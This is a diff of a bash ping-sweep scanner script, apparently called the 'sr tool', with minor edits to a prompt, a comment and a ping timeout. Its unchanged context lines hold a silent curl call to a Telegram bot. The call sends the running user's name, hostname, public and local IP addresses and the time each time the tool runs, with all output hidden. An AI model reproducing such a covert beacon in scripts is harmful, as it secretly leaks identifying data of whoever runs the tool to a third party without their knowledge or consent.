@@ -31,7 +31,7 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d text="🚨 sr tool executed 🚨%0A👤 User: $USER%0A💻 Host: $HOST%0A🌍 IP Public: $IP%0A📶 IP Local: $LOCAL_IP%0A🕒 Date: $DATE_TIME" >/dev/null 2>&1
 
 # Prompt for base IP
-read -p "Enter the base IP (e.g. 192.168.1.): " base_ip
+read -p "Enter the base IP (e.g. 192.168.1): " base_ip
 
 # Add dot if missing
 [[ "${base_ip}" != *"." ]] && base_ip="${base_ip}."
@@ -49,10 +49,10 @@ if [[ -n "$LOCAL_IP" ]]; then
     ((active_count++))
 fi
 
-# Scan loop (no subshells for correct counting)
+# Scan loop (without subshells for correct counting)
 for i in $(seq 1 254); do
     ip="${base_ip}${i}"
-    ping -c 1 -W 1 "$ip" > /dev/null 2>&1
+    ping -c 1 -W 2 "$ip" > /dev/null 2>&1
     if [ $? -eq 0 ]; then
         echo -e "\e[1;32m✅ Active: $ip\e[0m"
         ((active_count++))
